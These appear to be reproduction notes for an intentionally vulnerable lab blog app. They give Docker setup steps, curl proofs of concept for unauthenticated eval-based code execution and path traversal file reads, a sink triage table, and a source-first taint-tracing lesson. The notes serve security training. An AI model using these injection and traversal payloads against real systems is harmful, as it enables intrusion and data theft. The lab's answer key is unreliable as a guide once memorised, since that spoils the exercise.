# EOCON Blog -- Reproduction Notes

## Lancer via Docker

Build et demarrage :

    cd ~/EOCON/eocon-blog
    docker compose up --build

Distribution hors-ligne (sans reseau) :

    docker save eocon-blog:lab -o eocon-blog-image.tar

Chargement de l'archive sur une autre machine :

    docker load -i eocon-blog-image.tar
    docker run -p 5000:5000 eocon-blog:lab

L'app ecoute sur le port 5000. La base SQLite se cree et se seed au premier demarrage.


## Lancer sans Docker

    python3 -m venv .venv
    source .venv/bin/activate
    pip install -r requirements.txt
    python run.py


## V1 -- Remote Code Execution (unauthenticated)

Type: server-side code injection via eval()

Chain: request body -> app/routes/preview.py:9 (request.get_json) ->
app/services/templating.py:5 (process_template) ->
app/lib/render.py:12 (render) -> app/lib/render.py:5 (eval_expr) ->
app/lib/render.py:6 (eval). Three function hops, cross-file.

    curl -s -X POST localhost:5000/api/preview \
      -H 'Content-Type: application/json' \
      -d '{"body":"{{ __import__(\"os\").popen(\"id\").read() }}"}'

Output:

    {"rendered":"uid=0(root) ..."}

No authentication required. The preview endpoint accepts arbitrary body
content and evaluates expressions inside {{ }} delimiters via eval().


## V3 -- Path Traversal (unauthenticated)

Type: arbitrary file read via path traversal

Chain: app/routes/files.py:10 uses os.path.join(UPLOAD_DIR, name) where
name comes from the URL path without normalization or containment check.

    curl -s --path-as-is 'localhost:5000/files/../run.py'

Output:

    from app import create_app
    ...

Reads any file readable by the server process, outside the uploads/ directory.


## Sink Triage Table

| File:Line                       | Sink Type      | Reachable | Reason                                                                 |
|---------------------------------|----------------|-----------|------------------------------------------------------------------------|
| app/lib/render.py:6             | eval()         | YES       | V1. Source: request body via /api/preview, no auth. Cross-file chain.  |
| app/admin/console.py:31         | eval()         | NO        | Requires admin session + X-Admin-Token header + allowlist regex.       |
| app/services/importer.py:22     | pickle.loads() | NO        | Loads from local file only. Requires admin session. No network input.  |
| app/lib/config.py:15            | yaml.load()    | NO        | Uses Loader=yaml.SafeLoader. Reads local config.yml, not user input.  |
| app/services/thumbnailer.py:21  | subprocess.run | NO        | Filename validated by strict regex. Args passed as list, not shell.    |
| app/admin/routes.py:39          | os.popen()     | NO        | Fixed command ("hostname"). Behind admin session. No user input.       |


## Methodology

Scanning sinks (eval, exec, pickle, subprocess, yaml.load, os.popen) finds
six candidates across different files. Naive triage starting from sinks
produces five false positives: each one is either guarded by auth, restricted
to safe inputs, or unreachable from an external source.

The correct approach is to start from sources (request.get_json, request.args,
request.form) and trace data flow forward. Following request.get_json()["body"]
in app/routes/preview.py through process_template() and render() to eval() in
app/lib/render.py identifies the only unauthenticated RCE. The path traversal
(V3) is found by tracing the URL path parameter in app/routes/files.py to
os.path.join without containment.

Lesson: start from inputs, not from sinks.
